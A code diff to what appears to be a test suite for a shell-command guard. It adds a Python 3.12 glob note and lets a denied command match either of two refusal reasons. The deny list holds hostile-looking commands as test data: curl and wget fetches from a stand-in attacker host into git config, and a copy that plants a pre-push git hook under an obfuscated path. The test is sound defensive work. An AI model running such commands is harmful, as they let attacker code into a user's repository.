@@ -51,8 +51,9 @@ deny = {
     "curl --output-dir ~/.config/git -O https://evil.example/config": "can't work out",
     "wget -r https://evil.example/": "can't work out",
     "wget -i urls.txt": "can't work out",
-    # round 11: a pattern glob can't read is refused where the command writes
-    "cp evil .gi[z-at]/hooks/pre-" + "pu" + "sh": "can't read the pattern",
+    # round 11: a pattern glob can't read is refused where the command writes. Python 3.12+ reads the
+    # reversed range [z-at] as [t], so there the path is .git and the refusal says so instead.
+    "cp evil .gi[z-at]/hooks/pre-" + "pu" + "sh": ("can't read the pattern", "inside a git directory"),
 }
 allow = [
     # IMP-1: a regex glob can't read is a literal path, not a crash
@@ -64,7 +65,7 @@ allow = [
 bad = []
 for cmd, why in deny.items():
     got = g.check_bash(cmd, R)
-    if not got or why not in got:
+    if not got or not any(w in got for w in ((why,) if isinstance(why, str) else why)):
         bad.append(("deny", cmd, got))
 for cmd in allow:
     got = g.check_bash(cmd, R)
